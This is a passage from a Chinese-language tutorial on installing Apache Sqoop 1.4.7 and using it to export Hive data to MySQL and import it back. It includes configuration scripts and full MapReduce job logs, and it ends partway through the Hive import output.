  您可以使用 Sqoop 将数据从关系数据库管理系统RDBMS（如 MySQL 或 Oracle）导入 Hadoop 分布式文件系统 HDFS，转换 Hadoop MapReduce 中的数据，然后将数据导出回 RDBMS。
  Sqoop 自动执行此过程的大部分过程，依靠数据库来描述要导入的数据的模式。Sqoop 使用 MapReduce 导入和导出数据，提供并行操作和容错。
  
2、下载应用程序及配置环境变量
2.1、下载 Sqoop 1.4.7
  通过以下命令下载 Sqoop，解压后，放到/home/work/_app/ 目录中：
[root@c0 _src]# pwd
/home/work/_src
[root@c0 _src]# wget http://mirrors.shu.edu.cn/apache/sqoop/1.4.7/sqoop-1.4.7.bin__hadoop-2.6.0.tar.gz
[root@c0 _src]# tar -xzvf sqoop-1.4.7.bin__hadoop-2.6.0.tar.gz
[root@c0 _src]# mv sqoop-1.4.7.bin__hadoop-2.6.0 /home/work/_app/
  
2.2、设置环境变量
  在每一台机器上设置 Sqoop 环境变量，运行以下命令
echo "" >> /etc/bashrc
echo "# Sqoop 1.4.7" >> /etc/bashrc
echo "export SQOOP_HOME=/home/work/_app/sqoop-1.4.7.bin__hadoop-2.6.0" >> /etc/bashrc

echo "" >> /etc/bashrc
echo "# Path" >> /etc/bashrc
echo "export PATH=\$PATH:\$SQOOP_HOME/bin" >> /etc/bashrc
source /etc/bashrc
  
2.3、设置安装所需环境
  安装和运行 Sqoop 需要用到 Hive、MySql、Hadoop环境。可以参考文章：Hadoop 3.1.2(HA)+Zookeeper3.4.13+Hbase1.4.9(HA)+Hive2.3.4+Spark2.4.0(HA)高可用集群搭建
  
3、安装 Sqoop 1.4.7
3.1、修改 Sqoop 配置文件
3.1.1、修改配置文件 sqoop-env.sh
   创建 /home/work/_app/sqoop-1.4.7.bin__hadoop-2.6.0/conf/sqoop-env.sh 文件编辑并保存，内容为空，因为我们在本文的配置环境变量章节中已经配置了环境变量，同时也在<Hadoop 3.1.2(HA)+Zookeeper3.4.13+Hbase1.4.9(HA)+Hive2.3.4+Spark2.4.0(HA)高可用集群搭建>一文中配置了 Hive 和 Hadoop 环境变量：
[root@c0 ~]# echo "" > /home/work/_app/sqoop-1.4.7.bin__hadoop-2.6.0/conf/sqoop-env.sh
  
  将 /home/work/_app/hive-2.3.4/lib/ 目录下的 hive-hcatalog-core-2.3.4.jar、mysql-connector-java-5.1.47-bin.jar、hive-common-2.3.4.jar、libthrift-0.9.3.jar 文件，复制到/home/work/_app/sqoop-1.4.7.bin__hadoop-2.6.0/lib 目录下
[root@c0 ~]# cp /home/work/_app/hive-2.3.4/lib/hive-hcatalog-core-2.3.4.jar /home/work/_app/hive-2.3.4/lib/mysql-connector-java-5.1.47-bin.jar /home/work/_app/hive-2.3.4/lib/libthrift-0.9.3.jar /home/work/_app/hive-2.3.4/lib/hive-common-2.3.4.jar /home/work/_app/sqoop-1.4.7.bin__hadoop-2.6.0/lib/
  
3.1.2、修改配置文件 configure-sqoop
  编辑 /home/work/_app/sqoop-1.4.7.bin__hadoop-2.6.0/bin/configure-sqoop 文件并保存，内容如下：
[root@c0 _src]# cat /home/work/_app/sqoop-1.4.7.bin__hadoop-2.6.0/bin/configure-sqoop
#!/bin/bash
#
# Copyright 2011 The Apache Software Foundation
#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# This is sourced in by bin/sqoop to set environment variables prior to
# invoking Hadoop.

bin="$1"

if [ -z "${bin}" ]; then
  bin=`dirname $0`
  bin=`cd ${bin} && pwd`
fi

if [ -z "$SQOOP_HOME" ]; then
  export SQOOP_HOME=${bin}/..
fi

SQOOP_CONF_DIR=${SQOOP_CONF_DIR:-${SQOOP_HOME}/conf}

if [ -f "${SQOOP_CONF_DIR}/sqoop-env.sh" ]; then
  . "${SQOOP_CONF_DIR}/sqoop-env.sh"
fi

# Find paths to our dependency systems. If they are unset, use CDH defaults.

if [ -z "${HADOOP_COMMON_HOME}" ]; then
  if [ -n "${HADOOP_HOME}" ]; then
    HADOOP_COMMON_HOME=${HADOOP_HOME}
  else
    if [ -d "/usr/lib/hadoop" ]; then
      HADOOP_COMMON_HOME=/usr/lib/hadoop
    else
      HADOOP_COMMON_HOME=${SQOOP_HOME}/../hadoop
    fi
  fi
fi

if [ -z "${HADOOP_MAPRED_HOME}" ]; then
  HADOOP_MAPRED_HOME=/usr/lib/hadoop-mapreduce
  if [ ! -d "${HADOOP_MAPRED_HOME}" ]; then
    if [ -n "${HADOOP_HOME}" ]; then
      HADOOP_MAPRED_HOME=${HADOOP_HOME}
    else
      HADOOP_MAPRED_HOME=${SQOOP_HOME}/../hadoop-mapreduce
    fi
  fi
fi

# We are setting HADOOP_HOME to HADOOP_COMMON_HOME if it is not set
# so that hcat script works correctly on BigTop
if [ -z "${HADOOP_HOME}" ]; then
  if [ -n "${HADOOP_COMMON_HOME}" ]; then
     HADOOP_HOME=${HADOOP_COMMON_HOME}
     export HADOOP_HOME
  fi
fi

if [ -z "${HBASE_HOME}" ]; then
  if [ -d "/usr/lib/hbase" ]; then
    HBASE_HOME=/usr/lib/hbase
  else
    HBASE_HOME=${SQOOP_HOME}/../hbase
  fi
fi
#if [ -z "${HCAT_HOME}" ]; then
#  if [ -d "/usr/lib/hive-hcatalog" ]; then
#    HCAT_HOME=/usr/lib/hive-hcatalog
#  elif [ -d "/usr/lib/hcatalog" ]; then
#    HCAT_HOME=/usr/lib/hcatalog
#  else
#    HCAT_HOME=${SQOOP_HOME}/../hive-hcatalog
#    if [ ! -d ${HCAT_HOME} ]; then
#       HCAT_HOME=${SQOOP_HOME}/../hcatalog
#    fi
#  fi
#fi
#if [ -z "${ACCUMULO_HOME}" ]; then
#  if [ -d "/usr/lib/accumulo" ]; then
#    ACCUMULO_HOME=/usr/lib/accumulo
#  else
#    ACCUMULO_HOME=${SQOOP_HOME}/../accumulo
#  fi
#fi
if [ -z "${ZOOKEEPER_HOME}" ]; then
  if [ -d "/usr/lib/zookeeper" ]; then
    ZOOKEEPER_HOME=/usr/lib/zookeeper
  else
    ZOOKEEPER_HOME=${SQOOP_HOME}/../zookeeper
  fi
fi
if [ -z "${HIVE_HOME}" ]; then
  if [ -d "/usr/lib/hive" ]; then
    export HIVE_HOME=/usr/lib/hive
  elif [ -d ${SQOOP_HOME}/../hive ]; then
    export HIVE_HOME=${SQOOP_HOME}/../hive
  fi
fi

# Check: If we can't find our dependencies, give up here.
if [ ! -d "${HADOOP_COMMON_HOME}" ]; then
  echo "Error: $HADOOP_COMMON_HOME does not exist!"
  echo 'Please set $HADOOP_COMMON_HOME to the root of your Hadoop installation.'
  exit 1
fi
if [ ! -d "${HADOOP_MAPRED_HOME}" ]; then
  echo "Error: $HADOOP_MAPRED_HOME does not exist!"
  echo 'Please set $HADOOP_MAPRED_HOME to the root of your Hadoop MapReduce installation.'
  exit 1
fi

## Moved to be a runtime check in sqoop.
if [ ! -d "${HBASE_HOME}" ]; then
  echo "Warning: $HBASE_HOME does not exist! HBase imports will fail."
  echo 'Please set $HBASE_HOME to the root of your HBase installation.'
fi

## Moved to be a runtime check in sqoop.
#if [ ! -d "${HCAT_HOME}" ]; then
#  echo "Warning: $HCAT_HOME does not exist! HCatalog jobs will fail."
#  echo 'Please set $HCAT_HOME to the root of your HCatalog installation.'
#fi

#if [ ! -d "${ACCUMULO_HOME}" ]; then
#  echo "Warning: $ACCUMULO_HOME does not exist! Accumulo imports will fail."
#  echo 'Please set $ACCUMULO_HOME to the root of your Accumulo installation.'
#fi
if [ ! -d "${ZOOKEEPER_HOME}" ]; then
  echo "Warning: $ZOOKEEPER_HOME does not exist! Accumulo imports will fail."
  echo 'Please set $ZOOKEEPER_HOME to the root of your Zookeeper installation.'
fi

# Where to find the main Sqoop jar
SQOOP_JAR_DIR=$SQOOP_HOME

# If there's a "build" subdir, override with this, so we use
# the newly-compiled copy.
if [ -d "$SQOOP_JAR_DIR/build" ]; then
  SQOOP_JAR_DIR="${SQOOP_JAR_DIR}/build"
fi

function add_to_classpath() {
  dir=$1
  for f in $dir/*.jar; do
    SQOOP_CLASSPATH=${SQOOP_CLASSPATH}:$f;
  done

  export SQOOP_CLASSPATH
}

# Add sqoop dependencies to classpath.
SQOOP_CLASSPATH=""
if [ -d "$SQOOP_HOME/lib" ]; then
  add_to_classpath $SQOOP_HOME/lib
fi

# Add HBase to dependency list
if [ -e "$HBASE_HOME/bin/hbase" ]; then
  TMP_SQOOP_CLASSPATH=${SQOOP_CLASSPATH}:`$HBASE_HOME/bin/hbase classpath`
  SQOOP_CLASSPATH=${TMP_SQOOP_CLASSPATH}
fi

# Add HCatalog to dependency list
if [ -e "${HCAT_HOME}/bin/hcat" ]; then
  TMP_SQOOP_CLASSPATH=${SQOOP_CLASSPATH}:`${HCAT_HOME}/bin/hcat -classpath`
  if [ -z "${HIVE_CONF_DIR}" ]; then
    TMP_SQOOP_CLASSPATH=${TMP_SQOOP_CLASSPATH}:${HIVE_CONF_DIR}
  fi
  SQOOP_CLASSPATH=${TMP_SQOOP_CLASSPATH}
fi

# Add Accumulo to dependency list
if [ -e "$ACCUMULO_HOME/bin/accumulo" ]; then
  for jn in `$ACCUMULO_HOME/bin/accumulo classpath | grep file:.*accumulo.*jar | cut -d':' -f2`; do
    SQOOP_CLASSPATH=$SQOOP_CLASSPATH:$jn
  done
  for jn in `$ACCUMULO_HOME/bin/accumulo classpath | grep file:.*zookeeper.*jar | cut -d':' -f2`; do
    SQOOP_CLASSPATH=$SQOOP_CLASSPATH:$jn
  done
fi

ZOOCFGDIR=${ZOOCFGDIR:-/etc/zookeeper}
if [ -d "${ZOOCFGDIR}" ]; then
  SQOOP_CLASSPATH=$ZOOCFGDIR:$SQOOP_CLASSPATH
fi

SQOOP_CLASSPATH=${SQOOP_CONF_DIR}:${SQOOP_CLASSPATH}

# If there's a build subdir, use Ivy-retrieved dependencies too.
if [ -d "$SQOOP_HOME/build/ivy/lib/sqoop" ]; then
  for f in $SQOOP_HOME/build/ivy/lib/sqoop/*/*.jar; do
    SQOOP_CLASSPATH=${SQOOP_CLASSPATH}:$f;
  done
fi

add_to_classpath ${SQOOP_JAR_DIR}

HADOOP_CLASSPATH="${SQOOP_CLASSPATH}:${HADOOP_CLASSPATH}"
if [ ! -z "$SQOOP_USER_CLASSPATH" ]; then
  # User has elements to prepend to the classpath, forcibly overriding
  # Sqoop's own lib directories.
  export HADOOP_CLASSPATH="${SQOOP_USER_CLASSPATH}:${HADOOP_CLASSPATH}"
fi

export SQOOP_CLASSPATH
export SQOOP_CONF_DIR
export SQOOP_JAR_DIR
export HADOOP_CLASSPATH
export HADOOP_COMMON_HOME
export HADOOP_MAPRED_HOME
export HBASE_HOME
export HCAT_HOME
export HIVE_CONF_DIR
export ACCUMULO_HOME
export ZOOKEEPER_HOME
  
3.2、查看 Sqoop 版本
[root@c0 _src]# sqoop version
2019-03-11 22:30:16,837 INFO sqoop.Sqoop: Running Sqoop version: 1.4.7
Sqoop 1.4.7
git commit id 2328971411f57f0cb683dfb79d19d4d19d185dd8
Compiled by maugli on Thu Dec 21 15:59:58 STD 2017
  
4、启动和测试 Sqoop 的数据导入、导出
4.1、Sqoop 通过 Hive 导入数据到 Sqoop
  在 mysql 中创建数据库 testmshk 并授权给 root 用户，同时创建 hive2mysql_mshk 表
[root@c0 _src]# mysql -uroot -p123456
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 21
Server version: 5.7.25 MySQL Community Server (GPL)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> CREATE DATABASE testmshk DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;
Query OK, 1 row affected (0.00 sec)

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| hive               |
| mysql              |
| performance_schema |
| sys                |
| testmshk           |
+--------------------+
6 rows in set (0.02 sec)

mysql> grant select,insert,update,delete,create on testmshk.* to root;
Query OK, 0 rows affected (0.01 sec)

mysql> flush  privileges;
Query OK, 0 rows affected (0.01 sec)


mysql> use testmshk;
Database changed

mysql> create table hive2mysql_mshk(id int,namea varchar(50),nameb varchar(50));
Query OK, 0 rows affected (0.02 sec)

mysql> quit;
Bye
  
  通过 Sqoop 查询 Mysql 中表的内容，这时可以看到表中的内容是空的
[root@c0 ~]# sqoop eval --connect  jdbc:mysql://c0:3306/testmshk?useSSL=false  --username root --password 123456 --query "select * from hive2mysql_mshk"

2019-03-11 23:44:06,894 INFO sqoop.Sqoop: Running Sqoop version: 1.4.7
2019-03-11 23:44:06,945 WARN tool.BaseSqoopTool: Setting your password on the command-line is insecure. Consider using -P instead.
2019-03-11 23:44:07,100 INFO manager.MySQLManager: Preparing to use a MySQL streaming resultset.
-------------------------------------------------------------
| id          | namea                | nameb                |
-------------------------------------------------------------
-------------------------------------------------------------
  
  在<Hadoop 3.1.2(HA)+Zookeeper3.4.13+Hbase1.4.9(HA)+Hive2.3.4+Spark2.4.0(HA)高可用集群搭建>一文中，我们在测试 Hive 时创建了测试数据 /hive/warehouse/testtable/testdata001.dat 我们将这个数据，导入到 Mysql
[root@c0 ~]# sqoop export --connect  jdbc:mysql://c0:3306/testmshk?useSSL=false  --username root --password 123456 --table hive2mysql_mshk  --export-dir /hive/warehouse/testtable/testdata001.dat  --input-fields-terminated-by ','
2019-03-11 23:47:10,400 INFO sqoop.Sqoop: Running Sqoop version: 1.4.7
2019-03-11 23:47:10,437 WARN tool.BaseSqoopTool: Setting your password on the command-line is insecure. Consider using -P instead.
2019-03-11 23:47:10,571 INFO manager.MySQLManager: Preparing to use a MySQL streaming resultset.
2019-03-11 23:47:10,574 INFO tool.CodeGenTool: Beginning code generation
2019-03-11 23:47:10,914 INFO manager.SqlManager: Executing SQL statement: SELECT t.* FROM `hive2mysql_mshk` AS t LIMIT 1
2019-03-11 23:47:10,943 INFO manager.SqlManager: Executing SQL statement: SELECT t.* FROM `hive2mysql_mshk` AS t LIMIT 1
2019-03-11 23:47:10,952 INFO orm.CompilationManager: HADOOP_MAPRED_HOME is /home/work/_app/hadoop-3.1.2
Note: /tmp/sqoop-root/compile/9ea7f54fe87f35ed071ed75c293f25d8/hive2mysql_mshk.java uses or overrides a deprecated API.
Note: Recompile with -Xlint:deprecation for details.
2019-03-11 23:47:12,652 INFO orm.CompilationManager: Writing jar file: /tmp/sqoop-root/compile/9ea7f54fe87f35ed071ed75c293f25d8/hive2mysql_mshk.jar
2019-03-11 23:47:12,669 INFO mapreduce.ExportJobBase: Beginning export of hive2mysql_mshk
2019-03-11 23:47:12,669 INFO Configuration.deprecation: mapred.job.tracker is deprecated. Instead, use mapreduce.jobtracker.address
2019-03-11 23:47:12,804 INFO Configuration.deprecation: mapred.jar is deprecated. Instead, use mapreduce.job.jar
2019-03-11 23:47:14,106 INFO Configuration.deprecation: mapred.reduce.tasks.speculative.execution is deprecated. Instead, use mapreduce.reduce.speculative
2019-03-11 23:47:14,112 INFO Configuration.deprecation: mapred.map.tasks.speculative.execution is deprecated. Instead, use mapreduce.map.speculative
2019-03-11 23:47:14,112 INFO Configuration.deprecation: mapred.map.tasks is deprecated. Instead, use mapreduce.job.maps
2019-03-11 23:47:14,479 INFO client.ConfiguredRMFailoverProxyProvider: Failing over to rm2
2019-03-11 23:47:14,808 INFO mapreduce.JobResourceUploader: Disabling Erasure Coding for path: /tmp/hadoop-yarn/staging/root/.staging/job_1552315366846_0003
2019-03-11 23:47:16,429 INFO input.FileInputFormat: Total input files to process : 1
2019-03-11 23:47:16,432 INFO input.FileInputFormat: Total input files to process : 1
2019-03-11 23:47:16,513 INFO mapreduce.JobSubmitter: number of splits:4
2019-03-11 23:47:16,577 INFO Configuration.deprecation: mapred.map.tasks.speculative.execution is deprecated. Instead, use mapreduce.map.speculative
2019-03-11 23:47:16,684 INFO mapreduce.JobSubmitter: Submitting tokens for job: job_1552315366846_0003
2019-03-11 23:47:16,686 INFO mapreduce.JobSubmitter: Executing with tokens: []
2019-03-11 23:47:16,924 INFO conf.Configuration: resource-types.xml not found
2019-03-11 23:47:16,924 INFO resource.ResourceUtils: Unable to find 'resource-types.xml'.
2019-03-11 23:47:17,213 INFO impl.YarnClientImpl: Submitted application application_1552315366846_0003
2019-03-11 23:47:17,261 INFO mapreduce.Job: The url to track the job: http://c1:8088/proxy/application_1552315366846_0003/
2019-03-11 23:47:17,262 INFO mapreduce.Job: Running job: job_1552315366846_0003
2019-03-11 23:47:23,359 INFO mapreduce.Job: Job job_1552315366846_0003 running in uber mode : false
2019-03-11 23:47:23,360 INFO mapreduce.Job:  map 0% reduce 0%
2019-03-11 23:47:31,454 INFO mapreduce.Job:  map 75% reduce 0%
2019-03-11 23:47:32,462 INFO mapreduce.Job:  map 100% reduce 0%
2019-03-11 23:47:32,473 INFO mapreduce.Job: Job job_1552315366846_0003 completed successfully
2019-03-11 23:47:32,619 INFO mapreduce.Job: Counters: 32
    File System Counters
        FILE: Number of bytes read=0
        FILE: Number of bytes written=913424
        FILE: Number of read operations=0
        FILE: Number of large read operations=0
        FILE: Number of write operations=0
        HDFS: Number of bytes read=782
        HDFS: Number of bytes written=0
        HDFS: Number of read operations=19
        HDFS: Number of large read operations=0
        HDFS: Number of write operations=0
    Job Counters
        Launched map tasks=4
        Data-local map tasks=4
        Total time spent by all maps in occupied slots (ms)=23446
        Total time spent by all reduces in occupied slots (ms)=0
        Total time spent by all map tasks (ms)=23446
        Total vcore-milliseconds taken by all map tasks=23446
        Total megabyte-milliseconds taken by all map tasks=24008704
    Map-Reduce Framework
        Map input records=2
        Map output records=2
        Input split bytes=636
        Spilled Records=0
        Failed Shuffles=0
        Merged Map outputs=0
        GC time elapsed (ms)=582
        CPU time spent (ms)=3960
        Physical memory (bytes) snapshot=830259200
        Virtual memory (bytes) snapshot=11165683712
        Total committed heap usage (bytes)=454557696
        Peak Map Physical memory (bytes)=208502784
        Peak Map Virtual memory (bytes)=2793611264
    File Input Format Counters
        Bytes Read=0
    File Output Format Counters
        Bytes Written=0
2019-03-11 23:47:32,626 INFO mapreduce.ExportJobBase: Transferred 782 bytes in 18.5015 seconds (42.2668 bytes/sec)
2019-03-11 23:47:32,629 INFO mapreduce.ExportJobBase: Exported 2 records.

--export-dir 表示在 HDFS 对应的 Hive 数据库文件位置
–input-fields-terminated-by 表示要处理的间隔符

  
  再次通过 Sqoop 查看 MySql 中的内容，可以看到数据已经成功导入
[root@c0 ~]# sqoop eval --connect  jdbc:mysql://c0:3306/testmshk?useSSL=false  --username root --password 123456 --query "select * from hive2mysql_mshk"
2019-03-11 23:48:56,848 INFO sqoop.Sqoop: Running Sqoop version: 1.4.7
2019-03-11 23:48:56,884 WARN tool.BaseSqoopTool: Setting your password on the command-line is insecure. Consider using -P instead.
2019-03-11 23:48:57,024 INFO manager.MySQLManager: Preparing to use a MySQL streaming resultset.
-------------------------------------------------------------
| id          | namea                | nameb                |
-------------------------------------------------------------
| 10086       | my.mshk.top          | you.mshk.top         |
| 12306       | mname                | yname                |
-------------------------------------------------------------
  在 MySql 中能够看到我们创建的 hive2mysql_mshk 表有2行数据
  
  
4.2、Sqoop 通过 MySql 导入数据到 Hive
  刚刚我们创建的 hive2mysql_mshk 表没有任何主键，我们只是从 Hive 中添加了一些记录到 Mysql。
  默认情况下，Sqoop 将识别表中的主键列（如果存在）并将其用作拆分列。
  从数据库中检索拆分列的低值和高值，并且映射任务在总范围的大小均匀的组件上运行。
  如果主键的实际值在其范围内不均匀分布，则可能导致任务不平衡。
  您应该使用 --split-by 参数明确选择不同的列。例如-- split-by id。
  
  在将 MySql 的数据导入到 Hive中的 Sqoop 命令添加了更多参数：
sqoop import --connect jdbc:mysql://c0:3306/testmshk?useSSL=false --username root --password 123456 --split-by id  --table hive2mysql_mshk --target-dir /hive/warehouse/mysql2hive_mshk  --fields-terminated-by "," --hive-import --hive-table testmshk.mysql2hive_mshk

--split-by <column-name> 用哪个列来拆分
--table 告诉计算机您要从MySQL导入哪个表
--target-dir <dir> HDFS要存储的目录
--hive-import 将表导入Hive
--hive-overwrite 覆盖Hive表中的现有数据
--hive-table <table-name> 设置导入Hive时要使用的表名
--fields-terminated-by <char> 设置字段分隔符

  接下来 Sqoop 的操作是一个 map-reduce 工作。
[root@c0 _src]# sqoop import --connect jdbc:mysql://c0:3306/testmshk?useSSL=false --username root --password 123456 --split-by id  --table hive2mysql_mshk --target-dir /hive/warehouse/mysql2hive_mshk  --fields-terminated-by "," --hive-import --hive-table testmshk.mysql2hive_mshk --hive-overwrite
2019-03-12 20:21:05,060 INFO sqoop.Sqoop: Running Sqoop version: 1.4.7
2019-03-12 20:21:05,137 WARN tool.BaseSqoopTool: Setting your password on the command-line is insecure. Consider using -P instead.
2019-03-12 20:21:05,337 INFO manager.MySQLManager: Preparing to use a MySQL streaming resultset.
2019-03-12 20:21:05,348 INFO tool.CodeGenTool: Beginning code generation
2019-03-12 20:21:05,785 INFO manager.SqlManager: Executing SQL statement: SELECT t.* FROM `hive2mysql_mshk` AS t LIMIT 1
2019-03-12 20:21:05,821 INFO manager.SqlManager: Executing SQL statement: SELECT t.* FROM `hive2mysql_mshk` AS t LIMIT 1
2019-03-12 20:21:05,831 INFO orm.CompilationManager: HADOOP_MAPRED_HOME is /home/work/_app/hadoop-3.1.2
Note: /tmp/sqoop-root/compile/202a5bda3950a7ccc6782f3cfcc3a99d/hive2mysql_mshk.java uses or overrides a deprecated API.
Note: Recompile with -Xlint:deprecation for details.
2019-03-12 20:21:08,747 INFO orm.CompilationManager: Writing jar file: /tmp/sqoop-root/compile/202a5bda3950a7ccc6782f3cfcc3a99d/hive2mysql_mshk.jar
2019-03-12 20:21:08,761 WARN manager.MySQLManager: It looks like you are importing from mysql.
2019-03-12 20:21:08,761 WARN manager.MySQLManager: This transfer can be faster! Use the --direct
2019-03-12 20:21:08,761 WARN manager.MySQLManager: option to exercise a MySQL-specific fast path.
2019-03-12 20:21:08,762 INFO manager.MySQLManager: Setting zero DATETIME behavior to convertToNull (mysql)
2019-03-12 20:21:08,764 INFO mapreduce.ImportJobBase: Beginning import of hive2mysql_mshk
2019-03-12 20:21:08,765 INFO Configuration.deprecation: mapred.job.tracker is deprecated. Instead, use mapreduce.jobtracker.address
2019-03-12 20:21:08,928 INFO Configuration.deprecation: mapred.jar is deprecated. Instead, use mapreduce.job.jar
2019-03-12 20:21:09,656 INFO Configuration.deprecation: mapred.map.tasks is deprecated. Instead, use mapreduce.job.maps
2019-03-12 20:21:10,332 INFO client.ConfiguredRMFailoverProxyProvider: Failing over to rm2
2019-03-12 20:21:10,688 INFO mapreduce.JobResourceUploader: Disabling Erasure Coding for path: /tmp/hadoop-yarn/staging/root/.staging/job_1552315366846_0011
2019-03-12 20:21:12,618 INFO db.DBInputFormat: Using read commited transaction isolation
2019-03-12 20:21:12,619 INFO db.DataDrivenDBInputFormat: BoundingValsQuery: SELECT MIN(`id`), MAX(`id`) FROM `hive2mysql_mshk`
2019-03-12 20:21:12,622 INFO db.IntegerSplitter: Split size: 555; Num splits: 4 from: 10086 to: 12306
2019-03-12 20:21:12,696 INFO mapreduce.JobSubmitter: number of splits:4
2019-03-12 20:21:13,137 INFO mapreduce.JobSubmitter: Submitting tokens for job: job_1552315366846_0011
2019-03-12 20:21:13,140 INFO mapreduce.JobSubmitter: Executing with tokens: []
2019-03-12 20:21:13,443 INFO conf.Configuration: resource-types.xml not found
2019-03-12 20:21:13,443 INFO resource.ResourceUtils: Unable to find 'resource-types.xml'.
2019-03-12 20:21:13,533 INFO impl.YarnClientImpl: Submitted application application_1552315366846_0011
2019-03-12 20:21:13,593 INFO mapreduce.Job: The url to track the job: http://c1:8088/proxy/application_1552315366846_0011/
2019-03-12 20:21:13,594 INFO mapreduce.Job: Running job: job_1552315366846_0011
2019-03-12 20:21:20,705 INFO mapreduce.Job: Job job_1552315366846_0011 running in uber mode : false
2019-03-12 20:21:20,727 INFO mapreduce.Job:  map 0% reduce 0%
2019-03-12 20:21:29,927 INFO mapreduce.Job:  map 50% reduce 0%
2019-03-12 20:21:29,930 INFO mapreduce.Job: Task Id : attempt_1552315366846_0011_m_000000_0, Status : FAILED
[2019-03-12 20:21:28.236]Container [pid=19941,containerID=container_e15_1552315366846_0011_01_000002] is running 539445760B beyond the 'VIRTUAL' memory limit. Current usage: 199.9 MB of 1 GB physical memory used; 2.6 GB of 2.1 GB virtual memory used. Killing container.
Dump of the process-tree for container_e15_1552315366846_0011_01_000002 :
    |- PID PPID PGRPID SESSID CMD_NAME USER_MODE_TIME(MILLIS) SYSTEM_TIME(MILLIS) VMEM_USAGE(BYTES) RSSMEM_USAGE(PAGES) FULL_CMD_LINE
    |- 20026 19941 19941 19941 (java) 950 81 2678403072 50861 /opt/jdk1.8.0_201/bin/java -Djava.net.preferIPv4Stack=true -Dhadoop.metrics.log.level=WARN -Xmx820m -Djava.io.tmpdir=/home/work/_data/hadoop-3.1.2/nm-local-dir/usercache/root/appcache/application_1552315366846_0011/container_e15_1552315366846_0011_01_000002/tmp -Dlog4j.configuration=container-log4j.properties -Dyarn.app.container.log.dir=/home/work/_logs/hadoop-3.1.2/userlogs/application_1552315366846_0011/container_e15_1552315366846_0011_01_000002 -Dyarn.app.container.log.filesize=0 -Dhadoop.root.logger=INFO,CLA -Dhadoop.root.logfile=syslog org.apache.hadoop.mapred.YarnChild 192.168.11.32 41274 attempt_1552315366846_0011_m_000000_0 16492674416642
    |- 19941 19939 19941 19941 (bash) 1 2 115900416 307 /bin/bash -c /opt/jdk1.8.0_201/bin/java -Djava.net.preferIPv4Stack=true -Dhadoop.metrics.log.level=WARN   -Xmx820m -Djava.io.tmpdir=/home/work/_data/hadoop-3.1.2/nm-local-dir/usercache/root/appcache/application_1552315366846_0011/container_e15_1552315366846_0011_01_000002/tmp -Dlog4j.configuration=container-log4j.properties -Dyarn.app.container.log.dir=/home/work/_logs/hadoop-3.1.2/userlogs/application_1552315366846_0011/container_e15_1552315366846_0011_01_000002 -Dyarn.app.container.log.filesize=0 -Dhadoop.root.logger=INFO,CLA -Dhadoop.root.logfile=syslog org.apache.hadoop.mapred.YarnChild 192.168.11.32 41274 attempt_1552315366846_0011_m_000000_0 16492674416642 1>/home/work/_logs/hadoop-3.1.2/userlogs/application_1552315366846_0011/container_e15_1552315366846_0011_01_000002/stdout 2>/home/work/_logs/hadoop-3.1.2/userlogs/application_1552315366846_0011/container_e15_1552315366846_0011_01_000002/stderr

[2019-03-12 20:21:28.324]Container killed on request. Exit code is 143
[2019-03-12 20:21:28.335]Container exited with a non-zero exit code 143.

2019-03-12 20:21:30,978 INFO mapreduce.Job:  map 75% reduce 0%
2019-03-12 20:21:37,021 INFO mapreduce.Job:  map 100% reduce 0%
2019-03-12 20:21:37,032 INFO mapreduce.Job: Job job_1552315366846_0011 completed successfully
2019-03-12 20:21:37,145 INFO mapreduce.Job: Counters: 33
    File System Counters
        FILE: Number of bytes read=0
        FILE: Number of bytes written=915840
        FILE: Number of read operations=0
        FILE: Number of large read operations=0
        FILE: Number of write operations=0
        HDFS: Number of bytes read=425
        HDFS: Number of bytes written=49
        HDFS: Number of read operations=24
        HDFS: Number of large read operations=0
        HDFS: Number of write operations=8
    Job Counters
        Failed map tasks=1
        Launched map tasks=5
        Other local map tasks=5
        Total time spent by all maps in occupied slots (ms)=31981
        Total time spent by all reduces in occupied slots (ms)=0
        Total time spent by all map tasks (ms)=31981
        Total vcore-milliseconds taken by all map tasks=31981
        Total megabyte-milliseconds taken by all map tasks=32748544
    Map-Reduce Framework
        Map input records=2
        Map output records=2
        Input split bytes=425
        Spilled Records=0
        Failed Shuffles=0
        Merged Map outputs=0
        GC time elapsed (ms)=318
        CPU time spent (ms)=6520
        Physical memory (bytes) snapshot=815542272
        Virtual memory (bytes) snapshot=11174408192
        Total committed heap usage (bytes)=437780480
        Peak Map Physical memory (bytes)=206934016
        Peak Map Virtual memory (bytes)=2795565056
    File Input Format Counters
        Bytes Read=0
    File Output Format Counters
        Bytes Written=49
2019-03-12 20:21:37,154 INFO mapreduce.ImportJobBase: Transferred 49 bytes in 27.4776 seconds (1.7833 bytes/sec)
2019-03-12 20:21:37,159 INFO mapreduce.ImportJobBase: Retrieved 2 records.
2019-03-12 20:21:37,159 INFO mapreduce.ImportJobBase: Publishing Hive/Hcat import job data to Listeners for table hive2mysql_mshk
2019-03-12 20:21:37,188 INFO manager.SqlManager: Executing SQL statement: SELECT t.* FROM `hive2mysql_mshk` AS t LIMIT 1
2019-03-12 20:21:37,208 INFO hive.HiveImport: Loading uploaded data into Hive
2019-03-12 20:21:37,220 INFO conf.HiveConf: Found configuration file file:/home/work/_app/hive-2.3.4/conf/hive-site.xml
2019-03-12 20:21:49,491 INFO hive.HiveImport:
2019-03-12 20:21:49,492 INFO hive.HiveImport: Logging initialized using configuration in jar:file:/home/work/_app/hive-2.3.4/lib/hive-common-2.3.4.jar!/hive-log4j2.properties Async: true
2019-03-12 20:21:56,558 INFO hive.HiveImport: OK
2019-03-12 20:21:56,561 INFO hive.HiveImport: Time taken: 5.954 seconds
